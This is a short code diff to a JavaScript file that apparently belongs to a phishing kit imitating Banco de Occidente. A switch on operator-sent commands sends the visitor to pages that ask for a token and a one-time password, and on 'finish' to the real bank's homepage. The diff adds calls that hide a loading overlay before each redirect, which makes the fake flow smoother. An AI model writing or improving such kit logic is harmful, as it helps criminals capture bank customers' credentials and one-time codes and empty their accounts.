@@ -110,14 +110,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_token':
                 console.log('📱 Redirigiendo a token.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'token.html';
                 break;
             case 'request_otp':
                 console.log('🔢 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a bancodeoccidente.com.co');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.bancodeoccidente.com.co/';
                 break;
             default:
